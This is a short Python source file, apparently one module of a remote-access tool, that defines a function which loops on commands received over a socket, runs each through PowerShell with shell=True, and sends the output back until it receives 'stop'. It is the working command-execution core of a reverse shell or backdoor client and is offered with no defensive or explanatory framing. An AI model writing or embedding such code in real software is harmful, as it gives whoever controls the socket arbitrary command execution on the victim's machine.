# BOUSSOURA Mohamed Cherif , Boufarik-Blida-ALGERIA , 14:25 pm 05-12-2020

# This code run with Python3

import subprocess

def execute_command(my_socket):
    print("[*] Executing commands")
    while True:    
        user_command = my_socket.receive_data()
        print(user_command)
        if user_command == "stop":
            break
        output = subprocess.run(["powershell",user_command],shell=True,capture_output=True)
        if output.stderr.decode("utf-8") == "":
            cmd_result = output.stdout.decode("utf-8")
        else:
            cmd_result = output.stderr.decode("utf-8")
        my_socket.send_data(cmd_result)